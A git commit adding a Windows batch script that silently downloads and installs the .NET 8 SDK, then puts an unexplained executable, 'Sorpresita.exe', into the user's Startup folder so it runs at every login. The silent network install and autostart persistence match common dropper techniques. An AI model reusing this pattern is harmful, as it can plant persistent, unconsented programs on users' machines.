c023d6f667f26a327326cd024780fe117c268d1d
Chewico <chewico3d@gmail.com>
2025-02-24 12:09:39 +0100

    Init

---
+++ executing.bat
@@ -0,0 +1,39 @@
+@echo off
+setlocal
+
+:: Define .NET 8 SDK download URL (official Microsoft link)
+set "dotnetURL=https://download.visualstudio.microsoft.com/download/pr/653d3db1-4143-46e3-8053-4e7d926dc57a/6829b773c79d2367d441f5b8ec38b365/dotnet-sdk-8.0.100-win-x64.exe"
+
+:: Get script directory
+set "scriptDir=%~dp0"
+
+:: Define installer and application paths
+set "dotnetInstaller=%scriptDir%dotnet-installer.exe"
+set "targetApp=%scriptDir%Sorpresita.exe"
+
+:: Download .NET SDK if not already downloaded
+if not exist "%dotnetInstaller%" (
+    echo Downloading .NET 8 SDK...
+    powershell -Command "(New-Object Net.WebClient).DownloadFile('%dotnetURL%', '%dotnetInstaller%')"
+)
+
+:: Install .NET SDK silently
+echo Installing .NET 8 SDK...
+"%dotnetInstaller%" /quiet /norestart
+
+:: Check if installation was successful
+if %errorlevel% equ 0 (
+    echo Installation successful. Adding Sorpresita.exe to startup...
+    
+    :: Define startup shortcut path
+    set "startupShortcut=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\Sorpresita.lnk"
+    
+    :: Create a shortcut using PowerShell
+    powershell -Command "$ws = New-Object -ComObject WScript.Shell; $s = $ws.CreateShortcut('%startupShortcut%'); $s.TargetPath = '%targetApp%'; $s.Save()"
+
+    echo Done! Sorpresita.exe will run on startup.
+) else (
+    echo Failed to install .NET 8. Exit code: %errorlevel% > "%scriptDir%install-error.log"
+)
+
+exit /b
